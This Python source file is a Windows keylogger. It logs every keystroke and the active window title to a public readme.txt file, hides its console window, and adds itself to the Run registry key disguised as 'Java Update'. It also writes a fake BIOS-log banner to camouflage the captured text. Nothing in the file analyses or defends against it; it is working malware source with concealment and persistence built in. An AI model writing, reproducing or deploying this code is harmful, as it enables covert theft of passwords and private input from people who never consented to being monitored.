from pynput.keyboard import Key, Listener
import  time, datetime, os, sys
import  subprocess, platform
import  win32api, win32gui, win32con

time = 0
filename ='C:/Users/Public/readme.txt'
active = ''
text = ""
state = False
date = datetime.datetime.now()

def addtoregistry():
    hkey=win32api.RegCreateKey(win32con.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run")
    win32api.RegSetValueEx(hkey,'Java Update',0,win32con.REG_SZ,(os.getcwd()+"\\keylogger2.py"))
    win32api.RegCloseKey(hkey)

filename ='C:/Users/Public/readme.txt'

logfile = open(filename, 'a')
lf = open(filename, 'r')
x=lf.readline()
if(x==''):
    addtoregistry()
lf.close()
logfile.close()

logfile = open(filename, 'a')
text += '\n######################################\n'
text += '##       System startup BIOS        ##\n'
text += '##           intel logs             ##\n'
text += '##              amd64               ##\n'
text += '######################################\n'
logfile.write(text)
logfile.close()

def stealth():
    stealth=win32gui.FindWindow("ConsoleWindowClass",None)
    win32gui.ShowWindow(stealth,0)

def on_press(key):
    stealth()
    main_thread_id = win32api.GetCurrentThreadId()
    global text, logfile, filename, active
    text = ""
    logfile = open(filename, 'a')

    wg = win32gui
    newactive = wg.GetWindowText(wg.GetForegroundWindow())
    if newactive != active:
        text += " \n\n [*] Window activated. [" + str(date) + "] \n"
        text += "\t | " + newactive + " |\n"
        active = newactive
        logfile.write(text)
    k=str(key)
    if(k == 'Key.space'):
        k=' '
    elif(k == 'Key.tab'):
        k=' tab '
    elif(k == 'Key.enter'):
        k='\n'
    elif(k == 'Key.backspace'):
        k='\\b'
    k=k.replace("'","")
    logfile.write(k) 
    logfile.close()


with Listener(on_press=on_press) as listener:
    listener.join()
